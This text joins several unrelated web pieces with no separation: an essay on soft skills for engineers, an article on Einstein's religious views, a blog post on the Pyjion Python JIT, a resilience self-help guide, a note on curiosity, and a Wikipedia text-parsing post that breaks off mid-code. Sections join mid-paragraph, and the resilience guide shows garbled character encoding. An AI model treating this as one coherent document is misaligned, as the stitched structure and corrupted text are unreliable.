<p>Coming from a school whose implicit motto was “the more technical, the better”, I had to quickly get used to the idea that the new technicality coming out of school was primarily human. Don’t make me wrong: having technical knowledge is as necessary as expected by the business world. But if many of us have been trained to take up technical challenges, we have been much less prepared for the strangeness of human behavior.</p>

<blockquote>
  <p>Technical skills should no longer be your challenge, your challenge should now be human.</p>
</blockquote>

<p>Schopenhauer said in The Art of Being Right “<em>A man may be objectively in the right, and nevertheless in the eyes of bystanders, and sometimes in his own, he may come off worst</em>” which in our case could be perfectly translated as “<em>You may be technically right and yet not be supported by others.</em>”. Sometimes engaging technical decisions are taken on the basis of very non-technical arguments, for example:</p>
<ul>
  <li>you were sick on the day of an important meeting;</li>
  <li>your level in English is not good enough to argue well enough;</li>
  <li>your manager used to work at XYZ, therefore XYZ technology is chosen for the project;</li>
  <li>your ambition to change a design frightens the rest of the team, despite the little amount effort it actually requires;</li>
  <li>your colleague X doesn’t like you, therefore it doesn’t like your design;</li>
  <li>etc.</li>
</ul>

<p>The list is endless. Just keep in mind that if you want technical decisions to be accepted, you will have to arm yourself with skills that go well beyond technique, starting with <em>negotiation</em> for example.</p>



<p>The school doesn’t just train engineers in languages or tools, it establishes a culture and a discipline that becomes stronger or weaker by joining a firm. Depending on the business sector, company, project or team, not everyone gives the same attention to software engineering. It is very unlikely that this discipline is the core business of your company, nor even the academic background of your colleagues. The good practices, taken for granted, can then be violently disrupted: no code review, no unit tests, sometimes even no version-control tool.</p>

<p>The intuitive reflex of a young engineer is to bring a purely technical solution: no version-control tool? let’s install git! No code review? Let’s protect the master branch! No unit tests? Install the right testing library! Etc. But here we are, the problem is <em>not</em> technical, the problem is primarily human, more particularly cultural. Changing the corporate culture, or more modestly, <em>the culture of a team is far more difficult to change than any tool</em>.</p>

<p>I will always remember the long struggle to get GitLab for an old project. This was the kind of indispensable work tool for a software engineer. The battle was long, not because the tool did not exist (it just had to be downloaded and installed) but because the required culture was not ready.</p>

<p>It takes time and effort to change a culture, but it is well worth the effort. A tool can always be dropped, a <code>git push</code> can always be forced, but a disciplined team is hardly swindled. So when choosing between a very well equipped team and a very disciplined team, <em>choose discipline without hesitation</em>!</p>

<h2 id="professional--genius">Professional &gt; Genius</h2>

<p>In university, a lot of credit was given to geniuses who, alone, could compile a few thousand lines of complicated code in a single night’s work. When I entered the business world, my vision changed a lot from that kind of profile, capable of doing a lot of work in record time. Their confidence (or arrogance) leads to an extra commitment, which makes it difficult to meet delivery deadlines. And because geniuses understand complex things, they <a href="https://reflexio.debec.eu/principles-for-better-design#keep-it-simple-stupid">design complex systems</a> that no one understands. Their loneliness makes them unique masters of their subjects, thereby nurturing their self-esteem. Knowledge remains in their heads and their presence becomes necessary for every decision.</p>

<p><a href="https://armament.solutions/tactics/single-points-of-failure.html"><img src="https://reflexio.debec.eu/assets/single_point_of_failure.svg" alt="Single point of failure"></a></p>

<p>But geniuses also have 24-hour days and quickly turn out to be the <em>bottleneck</em> of everything, slowing down everyone else. You don’t need to be a software architecture expert to agree that it is not desirable to over-commit and underestimate a single resource: apart from the inability to scale, the resource is the single point of failure. <a href="https://en.wikipedia.org/wiki/Single_point_of_failure">The design of a single point of failure is unforgivable</a>. Once the engineer gets sick, goes on vacation, or leaves the company, the entire team will have to pay back months or even years of unprofessionalism.</p>

<p>It is a black and exaggerated portrait that I paint here. I can nevertheless bet that you will encounter this kind of profile in your career which, in addition to having a negative impact on entire projects (and on people’s health), will sometimes be claimed as a hero by the organization. <em>Real geniuses are the geniuses also capable of <a href="https://reflexio.debec.eu/principles-for-better-design#keep-it-simple-stupid">designing simplicity</a>, taking people on board while humble towards humanity and their workload</em>. These are called great professionals. They spread knowledge and responsibility in order to become not the single point of failure or the bottle neck.</p>

<blockquote>
  <p>Geniuses build scalable services, professionals are scalable geniuses. - <a href="https://twitter.com/arnaud_debec/status/1327584444849524736">Twitter</a></p>

Asked, at the close of a <a href="https://www.axios.com/elon-musk-tesla-death-bleeding-cash-a7928b06-3aae-43d7-bdde-5b9c41ef298f.html" target="_blank">conversation</a> with Axios, whether he believed in God, the CEO of both <a href="http://nautil.us/issue/65/in-plain-sight/so-can-we-terraform-mars-or-not" target="_blank">SpaceX</a> and Tesla paused, looked away from his interlocutors for a brief second, and then said, in that mild South African accent, “I believe there’s some explanation for this universe, which you might call God.”</p><p>Einstein did call it God. The German-Jewish physicist is famous for many things—his special and general theories of relativity, his burst of gray-white hair—including his esoteric remark, often intoned in discussions of the strange, probabilistic nature of quantum mechanics, that “God does not play dice.” A final or ultimate equation, describing the laws of nature and the origin of the cosmos, Einstein believed, could not involve chance intrinsically. Insofar as it did—it being the Copenhagen interpretation of quantum mechanics—it would be incomplete. (The consensus now among physicists is that he was wrong; God is indeterminate. “All the evidence points to him being an inveterate gambler,” Stephen Hawking once <a href="http://www.hawking.org.uk/does-god-play-dice.html" target="_blank"></a><a href="https://quod.lib.umich.edu/cgi/t/text/text-idx?cc=mqr;c=mqr;c=mqrarchive;idno=act2080.0039.401;g=mqrg;rgn=main;view=text;xc=1" target="_blank">said</a>, “who throws the dice on every possible occasion.”)</p><p>But what was with Einstein’s God-language in the first place? The question may be considered anew, in light of an auction at Christie’s, in New York, of a 1954 letter Einstein wrote that a couple years ago unexpectedly <a href="https://www.cnbc.com/2018/12/05/einsteins-god-letter-sold-at-auction-for-2point9-million--heres-why.html" target="_blank">sold</a> for $2.9 million. For the occasion the Princeton Club hosted a panel discussion on the conflict, or lack thereof, between science and religion, which featured theoretical physicist Brian Greene, philosopher Rebecca Newberger Goldstein, cognitive psychologist <a href="http://nautil.us/issue/72/quandary/human-exceptionalism-stifles-progress" target="_blank">Tania Lombrozo</a>, and Rabbi Geoff Mitelman, founding director of Sinai and Synapses, an organization dedicated to fostering respectful dialogue about religion and science. The event was open to the public, and I was excited to attend. (Full disclosure: At the time I was a&nbsp;<a href="http://sinaiandsynapses.org/2017-to-2019-sinai-synapses-fellows/" target="_blank">Sinai and Synapses fellow</a>.) I believe Einstein can still offer some insight on how to think about religion and science.</p><blockquote><p>“I believe in Spinoza’s God, who reveals himself in the lawful harmony of the world, not in a God who concerns himself with the fate and the doings of mankind.”</p> </blockquote><p>What Einstein said, in a note to the philosopher Eric Gutkind, whose book <i>Choose Life: The Biblical Call to Revolt</i> Einstein was reviewing, was nearly as scathing as any contemporary critique of religion you might hear from Richard Dawkins, <a href="http://nautil.us/issue/16/nothingness/an-atheists-guide-to-spirituality" target="_blank">Sam Harris</a>, or <a href="http://nautil.us/blog/why-christopher-hitchens-was-a-hero-to-scientists" target="_blank">Christopher Hitchens</a>. “The word God is for me,” Einstein wrote, “nothing more than the expression and product of human weakness, the Bible a collection of honorable, but still purely primitive, legends. No interpretation, no matter how subtle, can change this for me.”<br></p><p>It is no wonder why, for decades, Einstein’s views on religion became muddled in the popular imagination: The inconsistency is clear. Here, God means one thing; over there, another. Just going off his letter to Gutkind, Einstein appears to be an atheist. But read Einstein in other places and you find him directly declaring that he is not one. “I am not an Atheist,” he <a href="https://home.isi.org/john-gray-spinoza-today" target="_blank"></a><a href="https://books.google.com/books?id=c-ozDQAAQBAJ&amp;pg=PT53&amp;lpg=PT53&amp;dq=" q="I am not an atheist" target="_blank">said</a> in an interview published in 1930. “I do not know if I can define myself as a Pantheist. The problem involved is too vast for our limited minds.” Einstein was asked whether he was a <a href="http://nautil.us/blog/the-case-for-cosmic-pantheism" target="_blank">pantheist</a>. The rest of his response is worth quoting in full:</p><p>May I not reply with a parable? The human mind, no matter how highly trained, cannot grasp the universe. We are in the position of a little child, entering a huge library whose walls are covered to the ceiling with books in many different tongues. The child knows that someone must have written those books. It does not know who or how. It does not understand the languages in which they are written. The child notes a definite plan in the arrangement of the books, a mysterious order, which it does not comprehend, but only dimly suspects. That, it seems to me, is the attitude of the human mind, even the greatest and most cultured, toward God. We see a universe marvellously arranged, obeying certain laws, but we understand the laws only dimly. Our limited minds cannot grasp the mysterious force that sways the constellations. I am fascinated by Spinoza’s Pantheism. I admire even more his contributions to modern thought. Spinoza is the greatest of modern philosophers, because he is the first philosopher who deals with the soul and the body as one, not as two separate things.</p><p>Benedict Spinoza, the 17th century Jewish-Dutch philosopher, was also in his day confused for an atheist for writing things like this, from his treatise <i>Ethics</i>: “All things, I say, are in God, and everything which takes place takes place by the laws alone of the infinite nature of God, and follows (as I shall presently show) from the necessity of His essence.”</p><p>In 1929, Einstein received a telegram inquiring about his belief in God from a New York rabbi named Herbert Goldstein, who had heard a Boston cardinal say that the physicist’s theory of relativity implies “the ghastly apparition of atheism.” Einstein settled Goldstein down. “I believe in Spinoza’s God, who reveals himself in the lawful harmony of the world,” he told him, “not in a God who concerns himself with the fate and the doings of mankind.”</p><p>What that amounted to for Einstein, according to a 2006 <a href="https://hrcak.srce.hr/index.php?show=clanak&amp;id_clanak_jezik=19107" target="_blank">paper</a>, was a “cosmic religious feeling” that required no “<a href="http://nautil.us/issue/72/quandary/the-worth-of-an-angry-god" target="_blank">anthropomorphic conception of God</a>.” He <a href="https://www.sacred-texts.com/aor/einstein/einsci.htm" target="_blank">explained</a> this view in the <i>New York Times Magazine</i>: “The religious geniuses of all ages have been distinguished by this kind of religious feeling, which knows no dogma and no God conceived in man’s image; so that there can be no church whose central teachings are based on it. Hence it is precisely among the heretics of every age that we find men who were filled with this highest kind of religious feeling and were in many cases regarded by their contemporaries as atheists, sometimes also as saints. Looked at in this light, men like Democritus, Francis of Assisi, and Spinoza are closely akin to one another.”</p><p>So, as Einstein would have it, there is no necessary conflict between science and religion—or between science and “religious feelings.”</p><p><i>Brian Gallagher is an associate editor at&nbsp;</i>Nautilus<i>.

            <div>
                <p><em>This post is an update on the Pyjion project to plug the .NET 5 CLR JIT compiler into Python 3.9.</em></p>
<p>.NET 5 was released on November 10, 2020. It is the cross-platform and open-source replacement of the <a href="https://github.com/dotnet/core"><strong>.NET Core</strong></a> project and the <strong>.NET</strong> project that ran exclusively on Windows since the late 90’s.</p>
<p>.NET is formed of many components:</p>
<ul>
<li>3 builtin languages, C#, F# and VB.NET, each with its own compiler</li>
<li>A standard library</li>
<li>A common intermediate language to abstract the high level languages from the core runtime. This is a standard known as <a href="https://github.com/tonybaloney/ecma-335/tree/master/docs">ECMA 335 CIL</a>.</li>
<li>A common language runtime (CLR) that compiles CIL into native machine code so that it can be executed and packages executables into .exe formats.</li>
</ul>
<p><img alt=".NET architecture" src="https://tonybaloney.github.io/img/posts/Common_Language_Infrastructure.png"></p>
<p>.NET 5 CLR comes bundled with a performant JIT compiler (codenamed RyuJIT) that will compile .NETs CIL into native machine instructions on Intel x86, x86-64, and ARM CPU architectures.</p>
<p>You can write code in a number of languages, like C++, C#, F# and compile those into CIL and then into native machine code (as a binary executable) on macOS, Linux, and Windows. Pretty neat.</p>
<p>But this is a blog about Python. So what does this have to do with Python?</p>
<p>Pyjion is a project to replace the core execution loop of CPython by transpiling CPython bytecode to ECMA CIL and then using the .NET 5 CLR to compile that into machine code. It then executes the machine-code compiled JIT frames at runtime instead of using the native execution loop of CPython.</p>
<h2>Very-quick overview of Python’s compiler</h2>
<p>When CPython compiles Python code, it compiles it into an intermediate format, similar to .NET, called Python bytecode. This bytecode is cached on disk so that when you import a module that hasn’t changed, it doesn’t compile it every time. You can see the bytecode by disassembling any Python function:</p>
<pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; def half(x):
...    return x/2
... 
&gt;&gt;&gt; dis.dis(half)
  2           0 LOAD_FAST                0 (x)
              2 LOAD_CONST               1 (2)
              4 BINARY_TRUE_DIVIDE
              6 RETURN_VALUE
</code></pre>

<p>To execute anything on a CPU, you have to provide the OS with machine-code instructions. This can be accomplished by compiling them up-front using a compiled like the C or C++ compilers. They compile code into executable formats as either shared libraries or standalone executables. <a href="https://tonybaloney.github.io/posts/extending-python-with-assembly.html"><em>See my post on Python/assembly for a bit more info on this topic</em></a>.</p>
<p>CPython converts the bytecode into machine code instructions like looping over them in a precompiled function, called the evaluation loop. This is essentially a big for loop with a switch statement. The compiled version of CPython that you’re running already has the instructions required. This is why CPython’s evaluation loop is an “AOT”, or “Ahead of Time” compiled library:</p>
<p><img alt="diagram 1" src="https://tonybaloney.github.io/img/posts/Slide1.png"></p>
<p><strong>Note: There is a lot more to CPython’s compiler. I’ve written a <a href="https://realpython.com/products/cpython-internals-book/">whole book on the CPython compiler and the internals of CPython</a> if you want to learn more.</strong></p>
<p>There are a few issues with this approach. The biggest is speed. A series of inline machine-code instructions is very performant. CPython has to make judgements at runtime for which code branch to follow every time your function is run. This leads to CPython being 100x slower in “tight-loop” problems where its executing the same thing again and again. The machine-code is compiled ahead of time and it has to loop around to get to the right instructions. Checkout my PyCon talk for a more in-depth explanation:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/I4nkgJdVZFA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>The most common way around this performance barrier is to compile Python extensions from C. This produces a custom binary with inline machine-code instructions for the task at hand. This is how most machine-learning and data science libraries like numpy, pandas, SKL are put together. This approach is still AOT compiling the code. It also requires a lot of knowledge of C. This approach has worked really well for the data science community, where algorithms can be performant and leverage low-level platforms <a href="https://numba.pydata.org/numba-doc/latest/cuda/index.html">like GPUs or specialised AI chipsets</a>.</p>
<p>There are a few issues with the AOT extension module approach. One is that it still uses the evaluation loop. C extension modules are a set of functions. Once you call the C-compiled function, its in the performant code, but your Python code that’s calling it still lives inside Python’s loop. If you want to leverage a compiled library and your Python code is doing some heavy number crunching, you end up having to use an API of functions, like numpy, instead of a more fluent Python API:</p>
<pre><code>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; a = np.ones([9, 5, 7, 4])
&gt;&gt;&gt; c = np.ones([9, 5, 4, 3])
&gt;&gt;&gt; np.dot(a, c).shape
(9, 5, 7, 9, 5, 3)
&gt;&gt;&gt; np.matmul(a, c).shape
(9, 5, 7, 3)
</code></pre>

<h2>What Pyjion does to solve this issue</h2>
<p>A few releases of Python ago (CPython specifically, the most commonly used version of Python) in 3.7 a new API was added to be able to swap out “frame execution” with a replacement implementation. This is otherwise known as <a href="https://www.python.org/dev/peps/pep-0523/">PEP 523</a>. PEP 523 also added the capability to store additional attributes in <em>code objects</em> (compiled Python code.</p>
<p>Pyjion does not compile Python code. It compiles Python frames (code objects, like blocks, functions, methods, classes) into machine-code at runtime using a performant JIT:</p>
<p><img alt="diagram 2" src="https://tonybaloney.github.io/img/posts/Slide2.png"></p>
<p>CPython compiles the Python code, so whatever language features and behaviours there are in CPython 3.9, like the walrus operator, <a href="https://www.python.org/dev/peps/pep-0584">the dictionary union operator</a>, will all work exactly the same with this extension enabled. This also means that this extension uses the same standard library as Python 3.9.</p>
<p>Pyjion is a “pip installable” package for standard CPython that JIT compiles all Python code at runtime using the .NET 5 JIT compiler. You can use off-the-shelf CPython 3.9 on macOS, Linux or Windows. After installing this package you just import the module and enable the JIT.</p>
<p>Once a frame has been compiled, the binary code is cached in memory and reused every time the function is called:</p>
<p><img alt="diagram 3" src="https://tonybaloney.github.io/img/posts/Slide3.png"></p>
<h2>Using Pyjion</h2>
<p>To get started, you need to have .NET 5 installed, with Python 3.9 and the Pyjion package (I also recommend using a virtual environment).</p>
<p>After importing pyjion, enable it by calling <code>pyjion.enable()</code> which sets a compilation threshold to 0 (the code only needs to be run once to be compiled by the JIT):</p>
<pre><code>&gt;&gt;&gt; import pyjion
&gt;&gt;&gt; pyjion.enable()
</code></pre>

<p>Any Python code you define or import after enabling pyjion will be JIT compiled. You don’t need to execute functions in any special API, its completely transparent:</p>
<pre><code>&gt;&gt;&gt; def half(x):
...    return x/2
&gt;&gt;&gt; half(2)
1.0
</code></pre>

<p>Pyjion will have compiled the <code>half</code> function into machine code on-the-fly and stored a cached version of that compiled function inside the function object.
You can see some basic stats by running <code>pyjion.info(f)</code>, where <code>f</code> is the function object:</p>
<pre><code>&gt;&gt;&gt; pyjion.info(half)
{'failed': False, 'compiled': True, 'run_count': 1}
</code></pre>

<p>You can see the machine code for the compiled function by disassembling it in the Python REPL.
Pyjion has essentially compiled your small Python function into a small, standalone application.
Install <code>distorm3</code> first to disassemble x86-64 assembly and run <code>pyjion.dis.dis_native(f)</code>:</p>
<pre><code>&gt;&gt;&gt; import pyjion.dis
&gt;&gt;&gt; pyjion.dis.dis_native(half)
00000000: PUSH RBP
00000001: MOV RBP, RSP
00000004: PUSH R14
00000006: PUSH RBX
00000007: MOV RBX, RSI
0000000a: MOV R14, [RDI+0x40]
0000000e: CALL 0x1b34
00000013: CMP DWORD [RAX+0x30], 0x0
00000017: JZ 0x31
00000019: CMP QWORD [RAX+0x40], 0x0
0000001e: JZ 0x31
00000020: MOV RDI, RAX
00000023: MOV RSI, RBX
00000026: XOR EDX, EDX
00000028: POP RBX
00000029: POP R14
...
</code></pre>

<p>The complex logic of converting a portable instruction set into low-level machine instructions is done by .NET’s CLR JIT compiler.</p>
<p>All Python code executed after the JIT is enabled will be compiled into native machine code at runtime and cached on disk. For example, to enable the JIT on a simple <code>app.py</code> for a Flask web app:</p>
<pre><code>import pyjion
pyjion.enable()

from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, World!'

app.run()
</code></pre>

<p>That’s it.</p>
<h2>Will this be compatible with my existing Python code? What about C Extensions?</h2>
<p>The short answer is- if your existing Python code runs on CPython 3.9 – <strong>yes</strong> it will be compatible. To make sure, Pyjion has been tested against the full CPython “test suite” on all platforms. In fact, it was the first JIT ever to pass the test suite.</p>
<p>Thats because this isn’t a Python runtime, it uses the existing Python compiler to compile your code into Python bytecode (low level instructions).</p>
<p>Pyjion uses the same dynamic module loader as CPython, so if you import a Python extension from your virtual environment, it will work just the same in Pyjion.</p>
<h2>Project History</h2>
<p>Pyjion isn’t new. Brett Cannon and Dino Viehland started the Pyjion project 4 years ago. This was the first JIT to pass the full CPython test suite.
There were some limitations to the original proof-of-concept:</p>
<ul>
<li>Written against an old version of .NET Core</li>
<li>Required custom patches of .NET and compiling from source</li>
<li>Required custom patches of CPython and compiling from source</li>
<li>Only worked on Windows</li>
<li>It was written for Python 3.6 before PEP 523 was agreed and merged</li>
</ul>
<p>Has much changed since Python 3.6? To the average user, not really. But under the hood, the implementation of a few things has completely changed:</p>
<ul>
<li>Function calls</li>
<li>Iterators</li>
<li>Exception Handling</li>
<li>Dictionary, list and set comprehensions</li>
<li>Generators and coroutines</li>
</ul>
<p>Actually, a <strong>lot</strong> has changed in the last few releases of CPython. The new fork to get Pyjion working with the latest version of everything was a big undertaking…</p>
<p><img alt="not-much-has-changed" src="https://tonybaloney.github.io/img/posts-original/not-much-has-changed.png"></p>
<p>The goal with the latest patch was to get the project up to the condition of:</p>
<ul>
<li>Using the release binaries of .NET 5 and CPython 3.9</li>
<li>Making it work across all platforms</li>
<li>Implement the PEP523 interface</li>
<li>Implement all the new features of Python 3.9</li>
<li>Making the package “pip installable” from PyPi</li>
<li>Improving the test coverage</li>
<li>Adding a disassembler (both machine-code and CIL) to aid development</li>
</ul>
<h2>Is this faster?</h2>
<p>The short answer a little, but not by much (yet).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Adversity is everywhere. It can strike when youâ€™re least expecting it, and it might be accompanied by unpleasant, albeit normal, reactions such as anxiety, excessive worry, disappointment, grief, shame, frustration and sadness. Moving on from, and even growing through, a difficult or traumatic experience can be hard, but it <em>is</em> possible.</p>
<p>Iâ€™m sure youâ€™ve already heard, read or witnessed many inspiring stories of people who have bounced back from adversity, such as the death of a loved one, losing a job, serious physical illnesses, accidents, disasters or wars. But what should we do when weâ€™re faced with hardship ourselves? How will we deal with our pain? Can we prepare ourselves for this inevitable experience?</p>
<p>The answers to these questions are not straightforward, but the psychological concept of â€˜resilienceâ€™ can help. Given that weâ€™re all currently in the midst of an adverse situation â€“ the COVID-19 pandemic â€“ understanding resilience is especially pertinent. Resilience is defined as the ability to navigate successfully through, and recover from, stressful circumstances or crisis situations, and to do so in a way that leads to healthy functioning over time. That is, resilience is not only about bouncing back, but also about experiencing some sort of growth, such as finding meaning and purpose, self-awareness or experiencing improvement in interpersonal relationships.</p>
<p>Defining resilience might sound easy, but itâ€™s a more complex concept than you might think. First, many people display resilience immediately following exposure to a hardship or potentially traumatic event. And in the long term, most people who have gone through traumatic experiences donâ€™t show signs of depression or anxiety problems later in life. Consider the <a href="https://journals.sagepub.com/doi/10.1111/j.1467-9280.2006.01682.x" rel="nofollow noreferrer noopener">study</a> of New York residents in the wake of the terrorist attack of <span>11 September</span> 2001: the researchers found that <span>65 per cent</span> of those questioned had returned to their normal level of functioning within six months. You too might be capable of more resilience than you realise.</p>
<p>Second, although some people seem disposed to deal more effectively with stress and anxiety, and to better regulate their emotions, resilience is not a single trait that you either possess or you donâ€™t. Rather, itâ€™s a set of skills, including behaviours and thoughts that can be improved through learning and exposure to new experiences.</p>
<p>Third, although individual characteristics matter for resilience, <a href="https://pubmed.ncbi.nlm.nih.gov/11202047/" rel="nofollow noreferrer noopener">contextual</a> factors also have an influence, such as the social, health and economic resources available to you. For instance, you might be predisposed for resilience but, if you were brought up in an unsupportive and stressful environment by abusive parents, you might not develop it. In fact, as well as being inaccurate, it is unfair and harmful to see resilience purely as an individual trait â€“ people who struggle to recover from a negative life event might think that thereâ€™s something inherently wrong with them, which isnâ€™t true. Access to certain external resources is a major factor in anyoneâ€™s ability to display resilience.</p>
<p>Fourth, resilience is <a href="https://pubmed.ncbi.nlm.nih.gov/22559117/" rel="nofollow noreferrer noopener">dynamic</a>. You can be resilient in one context but then your capacity for resilience, or your ability to draw on available resources, might not be enough for another, possibly more demanding or difficult, situation. All of us can be more resilient at one stage in our lives but less so in another.</p>
<p>Fifth, being resilient doesnâ€™t mean that you wonâ€™t have a wound or a scar. For example, in one <a href="https://pubmed.ncbi.nlm.nih.gov/12416919/" rel="nofollow noreferrer noopener">study</a> of more than 200 people who had experienced the death of their spouse, even those identified as the most resilient reported having at least some grief symptoms. Almost everyone suffers some negative effects, such as emotional strain, throughout the journey of adversity but resilient individuals manage to recover well.</p>
<p>Lastly, it might sound paradoxical, but resilience comes from being in touch with adversity, not from trying to stay positive all the time, or from always running away from difficulties in life. Many of us are taught from an early age that we should avoid difficulties or stress, and itâ€™s true that toxic chronic stress is a <a href="https://pubmed.ncbi.nlm.nih.gov/27417486/" rel="nofollow noreferrer noopener">risk</a> factor for mental health problems. But exposure to some level of stress provides you with the necessary challenge to become stronger in the face of hardship, as long as you learn to cope successfully. By contrast, if youâ€™re overly avoidant of challenges in life then, when an unavoidable hardship arises, you wonâ€™t have developed the necessary skills to cope.</p>
<p>Understanding the complex, dynamic nature of resilience is important because it shows that there is no magic pill or a recipe that will make you resilient. Each individual will have their own way of coping with distress, their own pace of recovery, and levels of learning from a crisis. It is also totally fine to fail to recover quickly or entirely from a particular adversity. Itâ€™s okay to get hurt or lost during a difficult time.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Science doesnâ€™t have all the answers on how one becomes resilient, but what we do know is that it requires learning to tap into both inner and external resources. Iâ€™ll touch on some of the most fundamental ones.</p>
<p><strong>Connect with others</strong></p>
<p>During difficult times, it is common to want to withdraw from the world. This can be for varied reasons, such as feelings of shame, the fear of being judged, or not wishing to be a drain on others. Although there is nothing wrong with wanting solitude during difficult times, it is also important that you stay in touch with people, at least to an extent. <a href="https://pubmed.ncbi.nlm.nih.gov/12555794/" rel="nofollow noreferrer noopener">Research</a> shows that the risk of developing post-traumatic stress disorder is higher for people who lack post-trauma social support (bear in mind that, even if you have friends and family, if you avoid seeing or talking to them entirely, then it will be impossible for them to help you).</p>
<p>People who choose to connect with others and nurture their relationships, as opposed to isolating themselves, tend to become better at coping with a hardship and growing through their experience. The emotional and instrumental social support you get from your intimate relationships, and from your communities, can also give you the motivation to handle stress in a healthy way.</p>
<p>So, when difficulties are overwhelming, try reaching out to others who can provide support. There are a few different ways you could do this. One is simply by talking about what youâ€™re going through. It can be frustrating to talk to someone who just pretends that theyâ€™re listening or who is judgmental, so try to find someone who is accepting and good at listening. You could also try letting them know in advance that all you need is to be listened to. Another approach is to ask specifically for instrumental help, such as information, advice or help with daily tasks. More resilient people are usually aware that they canâ€™t solve every problem on their own. You might find it especially difficult to ask for help if youâ€™re used to handling problems on your own, or if you see relying on others as a sign of weakness. Try to remember that it takes courage to ask for help, and being in need simply means that youâ€™re human.</p>
<p>Here are a few more ideas for how to connect with others and get support: if you exercise or go for a walk, try inviting someone else along. Make a commitment to call or email loved ones regularly. Make use of the power of play â€“ laugh with friends or get silly. If there are social groups that share a common interest or hobby of yours, join them to exchange ideas or to get to know new people. Support others informally or through volunteer organisations; helping others makes us feel happy and valued.</p>
<p>Most importantly, donâ€™t wait for a disaster to occur to connect; make sure you have supportive relationships that nurture your sense of self-worth and need for intimacy, which in turn can contribute to resilience. If youâ€™re physically distant from your loved ones, look for ways to socially connect on a regular basis. Even the presence and support of a small number of people you can rely on can make a huge difference when adversity strikes.</p>
<p><strong>Accept and focus on what you can control</strong></p>
<p>About seven years ago, I was diagnosed with peripheral neuropathy, which is a type of nerve damage. For me, this chronic condition manifests itself as a constant sharp pain and burning sensation on my feet. My life was miserable for six months before the diagnosis, and the pain was unbearable. I could barely walk for five minutes at a time. Upon the diagnosis, I was prescribed medication that eased my pain. Although itâ€™s manageable now, the pain is always there, and Iâ€™ll probably be on medication for the rest of my life. For the first few months, I had difficulty accepting this. Back then, I <span>was 35</span> and had been physically very active before developing this illness. At least a hundred times I asked myself how it was possible. Rejecting and blaming myself, others or the world seemed to provide some relief but it didnâ€™t get me anywhere.</p>
<p>Then one day I decided to stop wrestling with my pain and to start acknowledging it. This didnâ€™t mean that I liked the situation â€“ I hated it â€“ but it provided me with the space to start being proactive and to find effective coping strategies. The more I accepted my situation and my pain, the less pain I felt. A <a href="https://pubmed.ncbi.nlm.nih.gov/16139188/" rel="nofollow noreferrer noopener">study</a> that involved experimentally inducing pain in <span>62 men and</span> women showed the effectiveness of acceptance â€“ those taught acceptance experienced less sensory pain compared with a control group who used simple distraction.</p>
<p>Note that acceptance is not about giving up or quitting. Itâ€™s about gently noticing whatâ€™s going on, and allowing unpleasant experiences to exist, without attempting to change or deny them. With acceptance, you can choose to do what really matters to you and follow your values more easily.

<p>There seems to be a strong, almost causal relationship between curiosity and creativity.</p>



<p>My hypothesis is that curious people constantly do three things that are essential for the creative process: exploring, observing and asking questions.</p>



<p><strong>Curious individuals are interested in nearly everything.</strong></p>



<p>They’re always learning about and exploring new subjects. As a result, they hold in their heads a wide-ranging reservoir of information and mental models. This allows them to cross-pollinate ideas, extrapolate concepts and make unexpected connections.</p>



<p><strong>Another thing they’re very good at is observing.&nbsp;</strong></p>



<p>Curious people tend to go through life at a different pace than everyone else. They move relatively slowly. And whenever something catches their attention, they stop to contemplate it. Their ability to look extensively at and into things allows them to unveil patterns that most people are too busy to see.</p>



<p><strong>Finally, curious people like to ask tons of questions.</strong></p>



<p>As everything else, questions are subject to probabilities — the more questions you ask, the higher your chances of asking a good question. Good questions, in turn, help them find things that don’t work or don’t make sense. Thus, opening the doors for breakthroughs and innovation.</p>



<p>By giving yourself permission to cultivate curiosity, you’re also laying the foundation for a prolific, creative life.</p>

<section id="main_content">


<p>I’m working on a project where I want to have an offline encyclopedia. It’s for training deep learning networks so it needs to be in plain text English. 
No markup, no special characters. Human readable without any interpreters, renderers, or parsers. I’ve got plenty of disk space, so that’s not a concern. 
Once I parse out all the Wikipedia articles I can get my hands on, I will create an index. Or I might index them into SOLR or something like that. Not sure yet.
I’m also going to implement it as a resource for a massive <a href="https://towardsdatascience.com/building-a-question-answering-system-part-1-9388aadff507">SQUAD repo</a>. I have uploaded a copy of the final result to <a href="https://www.kaggle.com/ltcmdrdata/plain-text-wikipedia-202011">Kaggle Datasets</a>. I’ve stashed the script in a <a href="https://github.com/daveshap/PlainTextWikipedia">dedicated repo on GitHub</a>.</p>



<p>The first thing I should have learned is that Wikipedia is written in a demented Frankenstein language called WikeMedia Text. It’s a hybrid of HTML/XML and Markdown. 
It has no consistency and is the worst example of spaghetti code I’ve ever seen. I’m sure there are better implementations today, but I can see how and why it ended up the way it did.
For instance, you need to be able to create robust references and links, so the URL syntax is way jacked. It relies on a lot of procedural generation at display time.
Personally, if it were done again today, I think something like Jekyll would be way better. Instead of rendering again and again every time someone visits a page, render it once after each edit.
But that’s just me. So instead we’re left with this horrible hybrid language that should die in a fire.</p>

<p>Fine, it is what it is. I’m an expert automator, dammit, and if a machine can automatically render this nonsense, then I sure as hell can <strong>unrender it</strong>.</p>

<h2 id="attempt-1---brute-force-regex">Attempt 1 - Brute Force Regex</h2>

<p>“Brute Force Regex” (BFR) is not a real thing. It’s just something I’ve been doing for years now in my automation habits. Usually, as a naive approach, I’ll try and do some 
search-and-replace jiggery pokery to just remove unwanted junk. Sometimes this is textual formatting, like brackets around tables or other HTML tags. 
So I ended up with the following function. Caution, it’s not pretty. This was just an experiment, and I wanted to share it so you would see what doesn’t work.</p>

<div><div><pre><code><span>def</span> <span>basic_replacements</span><span>(</span><span>text</span><span>):</span>
    <span>replacements</span> <span>=</span> <span>[</span>
    <span>(</span><span>'&amp;lt;'</span><span>,</span><span>'&lt;'</span><span>),</span>
    <span>(</span><span>'&amp;gt;'</span><span>,</span><span>'&gt;'</span><span>),</span>
    <span>(</span><span>'&amp;quot;'</span><span>,</span><span>'"'</span><span>),</span>
    <span>(</span><span>"'''"</span><span>,</span><span>' = '</span><span>),</span>
    <span>(</span><span>"'{2,}"</span><span>,</span><span>''</span><span>),</span>
